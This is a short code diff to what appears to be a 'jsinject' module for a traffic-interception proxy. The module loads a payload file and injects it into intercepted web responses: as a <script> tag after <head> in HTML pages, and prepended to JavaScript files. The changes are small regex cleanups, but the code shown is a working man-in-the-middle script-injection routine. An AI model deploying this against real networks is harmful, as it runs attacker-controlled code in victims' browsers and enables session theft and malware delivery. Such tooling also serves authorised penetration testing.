@@ -47,7 +47,7 @@ function randomString(length) {
 }
 
 function configure() {
-	payload_path = env("jsinject.payload").replace(/\s*/g, "")
+	payload_path = env("jsinject.payload").replace(/\s/g, "")
 	payload = readFile(payload_path)
 	payload = payload_container.replace("{{payload}}", payload).replace(/\{\{session_id\}\}/g, session_id)
 }
@@ -61,12 +61,12 @@ function onLoad() {
 
 function onResponse(req, res) {
 	configure()
-	if ( res.ContentType.match(/^text\/html/i) || req.Path.replace(/\?.*/i, "").match(/\.(htm|html)$/i) ) {
+	if ( res.ContentType.match(/^text\/html/i) || req.Path.replace(/\?.*/, "").match(/\.(htm|html)$/i) ) {
 		res.ReadBody()
 		log_debug("(" + green + "jsinject" + reset + ") attempting to inject HTML document in " + bold + req.Hostname + reset + " ...")
 		res.Body = res.Body.replace(/<head>/i, "<head><script>" + payload + "</script>")
 	}
-	if ( res.ContentType.match(/^text\/javascript/i) || res.ContentType.match(/^application\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
+	if ( res.ContentType.match(/^text\/javascript/i) || res.ContentType.match(/^application\/javascript/i) || req.Path.replace(/\?.*/, "").match(/\.js$/i) ) {
 		res.ReadBody()
 		log_debug("(" + green + "jsinject" + reset + ") attempting to inject JS document in " + bold + req.Hostname + reset + " ...")
 		res.Body = payload + res.Body
